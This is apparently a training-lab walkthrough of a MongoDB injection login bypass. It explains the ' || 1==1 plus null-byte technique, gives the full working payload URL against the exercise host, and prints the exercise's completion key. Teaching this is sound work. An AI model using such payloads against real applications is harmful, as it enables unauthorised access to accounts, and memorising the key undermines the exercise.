MongoDB injection

This example is the MongoDB version of the (in)famous ' or 1=1 --. 
If you remember what you saw previously, you know that you will need two things to bypass this login for:

    An always true condition.
    A way to correctly terminate the NoSQL query.

First, by reading MongoDB documentation you can find that the SQL or 1=1 translates to || 1==1 (note the double =). 
Then by poking around, you can see that a NULL BYTE will prevent MongoDB from using the rest of the query. 
In some cases, You can also use the comments // or <!-- to comment out the end of the query.

With this information, you should be able to bypass the authentication form.

 You can access this exercise using the following URL: http://ptc-04c8bbd5-a2a4f6dc.libcurl.so/. 

 Steps:
    1)  Visit the given URL: http://ptc-04c8bbd5-a2a4f6dc.libcurl.so/. 
    2)  We can see login page. Let's put own credentials. And observe the parameter. 
        Also try to inject with single quote (') in admin as below:
        http://ptc-04c8bbd5-a2a4f6dc.libcurl.so/?username=admin'&password=admin&submit=Submit+Query
        We Can't canonicalize query :: caused by :: SyntaxError
        But while we inject with double quote ("), nothing happens.
    3) Let's try to inject with plus sign (+) obviously encoded.
        Let's make some concept:
            ' or 1=1-- 
            -----> SQL Injection
            ' || 1==1 &00
            ------> MongoDB injection

    4)  Finally change the parameter to inject mongodb as below link:
        http://ptc-04c8bbd5-a2a4f6dc.libcurl.so/?username=lol%27%20||%201==1%20%00&password=lol&submit=Submit+Query
    5) Bravo!! Success!!! The key for this exercise is 1d3b44ac-2b0c-4461-9650-846fa54fa5b4

            Happy Hacking!! :) s
        